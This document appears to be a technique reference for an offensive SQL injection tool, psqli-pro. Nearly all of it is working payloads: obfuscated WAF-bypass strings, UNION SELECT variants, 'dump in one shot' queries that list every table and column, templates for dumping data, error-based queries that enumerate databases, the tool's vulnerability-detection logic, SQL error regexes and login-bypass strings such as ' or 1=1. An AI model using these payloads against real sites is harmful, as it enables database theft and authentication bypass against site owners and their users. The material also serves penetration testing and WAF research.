# PSQLI-Pro Technique Reference

Source: https://github.com/Agressiv1njector/psqli-pro (Kedjaw3n / Agressiv1njector)

## Whitespace / WAF Bypass Techniques

```
w1="/**8**/"
w2="%23%0a"
w3="/*!50000"
w3a="*/"
w4="%250a"
w5="%23" + LONG_A_STRING + "%0a"
w6="%23" + LONG_A_STRING + "%0a"
w7=LONG_PLUS_STRING + "%09"
w8="--%20-%0A"
w9="/**8**/DisTIncTrow%23" + LONG_A_STRING + "%0a"
w10="%2523" + LONG_A_STRING + "%0A"
```

## UNION SELECT Variants

```
union="/**8**/and/**8**/mod(9,9)/**8**//*!50000union*//**8**//*!50000select*//**8**/"
union1="/**8**/and/**8**/0/**8**//*!50000UniOn*//**8**//*!50000select*//**8**/"
union2="%20and%200+/**8**//*!50000UniON*/%20/*!50000sEleCt*/%20"
bof="+and+mod(9,9)+/*!50000UniON*/%23" + LONG_A + "%0A/*!50000sEleCt*/+"
bof2="+and+mod(9,9)+/*!50000UniON*/%09" + LONG_PLUS + "/*!50000sEleCt*/+"
urlencode="+div+0+/*!50000%55NIoN*/+/*!50000%53eLEct*/+"
double_url="+and+mod(9,9)%20unION%2523" + LONG_a + "%0aSelect%20"
whitespaces="%0aand%0a0%0aUniON%0aselect%0A"
basic_1="/**//*!12345UNION+SELECT*//**/"
```

## DIOS Techniques (Dump In One Shot)

### dios1 — Basic @variable technique (basic waf)
```sql
(select(@x)from(select(@x:=0x00),(select(0)From(information_schema.columns)
where(table_schema=database/**_**/())and(0x00)in(@x:=coNcat(@x,0x3c6c693e,
table_name,0x3a3a,column_name))))x)
```

### dios2 — export_set (madblood waf)
```sql
export_set(5,@:=0,(select+count(*)from(information_schema.columns)
where@:=export_set(5,export_set(5,@,0x3c6c693e,column_name,2),0x3a3a,
table_name,2)),@,2)
```

### dios3 — Zen waf technique
```sql
(sELecT(@)from(sELecT(@:=0x00),(sELecT(@)from(`InFoRMAtiON_sCHeM`.`ColUMNs`)
where(`TAblE_sCHemA`=DatAbAsE())and(@)in(@:=CoNCat(@,0x3c6c693e,
TaBLe_nAMe,0x3a3a,column_name))))a)
```

### dios4 — No waf export_set (madblood no waf)
```sql
(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)
where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,
0x3a3a,2)),@,2))
```

## Dump Query Templates

### Standard (no WAF)
```sql
(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM({table})
WHERE(@x)IN(@x:=CONCAT(0x20,@x,0x3c6c693e,{colon}))))x)

(SELECT+GROUP_CONCAT(0x3c6c693e,{colon})+FROM+{table})
```

### WAF bypass versions
```sql
(SELECT(@x)/*!50000FROM*/(SELECT(@x:=0x00),(SELECT(@x)FROM({table})
WHERE(@x)IN(@x:=/*!50000CONCAT*//**8**/(0x20,@x,0x3c6c693e,{colon}))))x)

(SELECT+/*!50000GROUP_CONCAT*//**8**/(0x3c6c693e,{colon})+/*!50000FROM*/+{table})
```

### Custom bypass whitespace
```sql
(SELECT(@x){by}FROM{by}(SELECT{by}(@x:=0x00),(SELECT(@x){by}FROM{by}({table})
WHERE(@x)IN(@x:=CONCAT{by}/**8**/(0x20,@x,0x3c6c693e,{colon}))))x)

(SELECT+GROUP_CONCAT{by}/**8**/(0x3c6c693e,{colon})+{by}FROM{by}+{table})
```

## Database Enumeration Queries

### Current DB
```sql
+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(
DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES
WHERE+table_schema=DATABASE()+LIMIT+1,1),FLOOR(RAND(0)*2))x
FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+
```

### All databases
```sql
+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(
schema_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.SCHEMATA
LIMIT+{offset},1),FLOOR(RAND(0)*2))x
FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+
```

### Tables for database
```sql
table_schema={db_hex}+LIMIT+{offset},1...
```

### Columns for table
```sql
table_name={table_hex}+AND+table_schema={db_hex}+LIMIT+{offset},1...
```

## Auto Detection Logic

The original psqli-pro uses diff-based detection:
1. Fetch page normally → save to .site
2. Fetch page with `%27` (') → save to .site2  
3. Fetch page with `%27--+` → save to .site3
4. Compare .site vs .site2
   - If different → vulnerable
   - If .site == .site3 → string-based (needs `'` closer)
   - If .site != .site3 → integer-based

## SQL Error Detection Patterns

```regex
Warning: mysql_query|Warning: mysql_fetch_row|MySQL Error|MySQL ODBC|
supplied argument is not a valid MySQL result resource|on MySQL result index|
Oracle ODBC|Oracle Error|Microsoft JET Database Engine error|ADODB.Command|
ADODB.Field error|Microsoft OLE DB Provider for SQL Server error|
OLE DB Provider for ODBC|ODBC SQL|ODBC Driver|ODBC Error|
Invision Power Board Database Error|DB2 ODBC|DB2 error|
error in your SQL syntax|unexpected end of SQL command|invalid query|
SQL command not properly ended|Unclosed quotation mark|BOF or EOF|
Incorrect syntax near|ORA-00921: unexpected end of SQL command
```

## SQL Login Bypass Payloads

```sql
test
' or 1=1 limit 1-- -+
'=''or'
admin
'=''or'@gmail.com
```
